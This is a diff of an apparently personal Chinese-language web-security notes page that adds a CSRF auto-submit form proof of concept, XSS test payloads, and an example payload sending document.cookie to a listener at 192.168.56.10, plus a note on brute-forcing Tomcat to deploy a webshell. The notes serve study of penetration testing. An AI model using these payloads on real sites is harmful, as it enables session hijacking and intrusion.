@@ -196,124 +196,6 @@
         
       
       
-        
-
-  
-
-<nav class="md-tabs md-tabs--active" data-md-component="tabs">
-  <div class="md-tabs__inner md-grid">
-    <ul class="md-tabs__list">
-      
-        
-  <li class="md-tabs__item">
-    
-      <a href="../.." title="README" class="md-tabs__link">
-        README
-      </a>
-    
-  </li>
-
-      
-        
-  
-  
-    
-    
-  
-  
-    <li class="md-tabs__item">
-      
-        <a href="../../cloud/ai/AI/" title="Cloud" class="md-tabs__link">
-          Cloud
-        </a>
-      
-    </li>
-  
-
-  
-
-      
-        
-  
-  
-    
-    
-  
-  
-    <li class="md-tabs__item">
-      
-        <a href="../../coding/db/Druid/" title="Coding" class="md-tabs__link">
-          Coding
-        </a>
-      
-    </li>
-  
-
-  
-
-      
-        
-  
-  
-    <li class="md-tabs__item">
-      
-        <a href="../../design/UML/" title="Design" class="md-tabs__link">
-          Design
-        </a>
-      
-    </li>
-  
-
-      
-        
-  
-  
-    
-    
-  
-  
-    <li class="md-tabs__item">
-      
-        <a href="../../environment/net/私网IP地址范围/" title="Environment" class="md-tabs__link">
-          Environment
-        </a>
-      
-    </li>
-  
-
-  
-
-      
-        
-  
-  
-    <li class="md-tabs__item">
-      
-        <a href="../../other/schedule/" title="Other" class="md-tabs__link">
-          Other
-        </a>
-      
-    </li>
-  
-
-      
-        
-  
-  
-    <li class="md-tabs__item">
-      
-        <a href="../OpenSSL/" title="Security" class="md-tabs__link md-tabs__link--active">
-          Security
-        </a>
-      
-    </li>
-  
-
-      
-    </ul>
-  </div>
-</nav>
-      
       <main class="md-main">
         <div class="md-main__inner md-grid" data-md-component="container">
           
@@ -529,6 +411,18 @@
 
 
   <li class="md-nav__item">
+    <a href="../../cloud/openstack/VxLAN/" title="VxLAN" class="md-nav__link">
+      VxLAN
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
     <a href="../../cloud/openstack/neutron/" title="neutron" class="md-nav__link">
       neutron
     </a>
@@ -579,6 +473,18 @@
   <li class="md-nav__item">
     <a href="../../cloud/openstack/虚拟化/" title="虚拟化" class="md-nav__link">
       虚拟化
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../cloud/openstack/路由Routing/" title="路由Routing" class="md-nav__link">
+      路由Routing
     </a>
   </li>
 
@@ -2457,6 +2363,26 @@
     cookie中的会话标识
   </a>
   
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#csrf" title="CSRF" class="md-nav__link">
+    CSRF
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss" title="XSS" class="md-nav__link">
+    XSS
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
         
           <li class="md-nav__item">
@@ -2614,6 +2540,26 @@
     cookie中的会话标识
   </a>
   
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#csrf" title="CSRF" class="md-nav__link">
+    CSRF
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss" title="XSS" class="md-nav__link">
+    XSS
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
         
           <li class="md-nav__item">
@@ -2672,7 +2618,7 @@
 <li>burpsuite拦截修改请求，如上传文件把<code>content-type: text/html</code>改成<code>image/png</code>，修改<code>User-Agent</code>。</li>
 <li>burpsuite intruder爆破爬取URL</li>
 <li>repeater多次修改请求</li>
-<li>爆破tomcat部署webshell</li>
+<li>用户身份在客户端请求参数中携带，如id，篡改。</li>
 </ol>
 <h2 id="_2">安全维度<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
 <h3 id="_3">一、身份验证<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
@@ -2693,6 +2639,7 @@
 <li>NTLM/Windows身份验证：持久连接交换challenge</li>
 <li>Kerberos身份验证：Windows凭证登录</li>
 <li>Bearer tokens</li>
+<li>爆破tomcat部署webshell</li>
 </ul>
 <h3 id="_4">二、会话管理<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
 <h4 id="cookie">cookie中的会话标识<a class="headerlink" href="#cookie" title="Permanent link">&para;</a></h4>
@@ -2704,6 +2651,55 @@
 <li>会话固定：构造恶意链接诱骗用户点击，使用其预设的SESSIONID</li>
 <li>burp sequencer分析sessionid是否随机：获取存在set-cookie的响应，发送到sequencer，分析cookie，解码获取中的sessionid</li>
 </ul>
+<h5 id="csrf">CSRF<a class="headerlink" href="#csrf" title="Permanent link">&para;</a></h5>
+<p>POC：创建一个页面，包含form指向攻击请求地址。 &rarr; 在javascript里自动提交。 &rarr; 诱骗受害者在同一个浏览器中访问该页面。</p>
+<div class="superfences-tabs">
+<input name="__tabs_1" type="radio" id="__tab_1_0" checked="checked" />
+<label for="__tab_1_0">使用脚本自动提交</label>
+<div class="superfences-content"><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
+2
+3
+4
+5
+6
+7</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;http://www.baidu.com&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;csrf_form&quot;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;description&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="kd">var</span> <span class="nx">form</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;csrf_form&quot;</span><span class="p">);</span>
+    <span class="nx">form</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</pre></div>
+</td></tr></table></div>
+<input name="__tabs_1" type="radio" id="__tab_1_1" />
+<label for="__tab_1_1">在body加载时提交</label>
+<div class="superfences-content"><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
+2
+3
+4
+5
+6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="kd">function</span> <span class="nx">dosubmit</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="nx">form</span><span class="p">).</span><span class="nx">submit</span><span class="p">()</span>
+<span class="p">}</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">dosubmit()</span><span class="p">&gt;&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</pre></div>
+</td></tr></table></div>
+</div>
+<h5 id="xss">XSS<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h5>
+<p>特征：输入<code>&lt;</code>原样显示，查看源码未做编码。</p>
+<p>POC：</p>
+<ul>
+<li><code>&lt;script&gt;alert('xss')&lt;/script&gt;</code></li>
+<li><code>&lt;img src=x onerror="javascript:alert('xss')"&gt;</code></li>
+<li>闭合如<code>&lt;input value="输入的内容"&gt;</code>：<code>" onmouserover="javascript:alert('xss')</code> &rarr; <code>&lt;input value="输入的内容" onmouseover="javascript:alert('xss')"&gt;</code></li>
+<li>在href属性中注入链接或者其他事件，使用户在点击的时候触发：<code>&lt;a href="javascript:alert('xss')"&gt;点击我&lt;/a&gt;</code></li>
+</ul>
+<div class="admonition example">
+<p class="admonition-title">利用XSS获取cookie</p>
+<p>启动一个服务器接收请求，利用XSS发送请求<code>&lt;script&gt;document.write('&lt;img src="http://192.168.56.10:88/'+document.cookie+'"&gt;');&lt;/script&gt;</code>，获取受害者cookie。</p>
+</div>
 <h4 id="token">token<a class="headerlink" href="#token" title="Permanent link">&para;</a></h4>
 <h2 id="_5">特征<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
 <ul>
